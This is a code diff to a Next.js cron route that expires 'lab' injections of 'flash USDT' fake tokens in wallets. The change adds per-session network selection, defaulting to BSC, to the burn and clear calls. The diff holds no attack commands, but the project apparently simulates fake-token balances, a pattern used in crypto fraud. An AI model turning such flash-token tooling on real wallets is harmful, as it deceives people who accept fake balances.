@@ -2,6 +2,7 @@ import { NextResponse } from "next/server";
 import { createAdminClient } from "@/lib/supabase/admin";
 import { burnFlashUsdt, clearFlashCredit } from "@/lib/evm/flash-usdt-lab";
 import type { LabInjectionMode } from "@/lib/labs/types";
+import { parseEvmNetwork, type EvmNetwork } from "@/lib/evm/network";
 
 /**
  * GET /api/cron/labs/expire — expira inyecciones (burn modo 1, clearFlash modo 2).
@@ -25,7 +26,9 @@ export async function GET(req: Request) {
 
   const { data: expired, error } = await admin
     .from("lab_injections")
-    .select("id, session_id, wallet_id, amount, injection_mode, lab_wallets(wallet_address)")
+    .select(
+      "id, session_id, wallet_id, amount, injection_mode, lab_wallets(wallet_address), lab_sessions(network)"
+    )
     .in("status", ["injected", "pending_flash"])
     .is("burned_at", null)
     .lte("expires_at", now);
@@ -43,6 +46,13 @@ export async function GET(req: Request) {
       | null;
     const wallet = Array.isArray(walletRaw) ? walletRaw[0] : walletRaw;
     const walletAddress = wallet?.wallet_address;
+
+    const sessionRaw = injection.lab_sessions as
+      | { network: string }
+      | { network: string }[]
+      | null;
+    const session = Array.isArray(sessionRaw) ? sessionRaw[0] : sessionRaw;
+    const network = (parseEvmNetwork(session?.network) ?? "bsc") as EvmNetwork;
     const mode = (injection.injection_mode ?? "fake_token") as LabInjectionMode;
 
     if (!walletAddress) {
@@ -52,8 +62,8 @@ export async function GET(req: Request) {
 
     const burnResult =
       mode === "pending_flash"
-        ? await clearFlashCredit(walletAddress)
-        : await burnFlashUsdt(walletAddress, Number(injection.amount), "fake_token");
+        ? await clearFlashCredit(walletAddress, network)
+        : await burnFlashUsdt(walletAddress, network, Number(injection.amount), "fake_token");
 
     if (burnResult.success) {
       const expiredStatus = mode === "pending_flash" ? "flash_expired" : "burned";
@@ -79,12 +89,14 @@ export async function GET(req: Request) {
           injectionId: injection.id,
           burnTxHash: burnResult.txHash,
           simulated: burnResult.simulated ?? false,
+          network,
         },
       });
 
       results.push({
         injectionId: injection.id,
         mode,
+        network,
         success: true,
         burnTxHash: burnResult.txHash,
         simulated: burnResult.simulated,
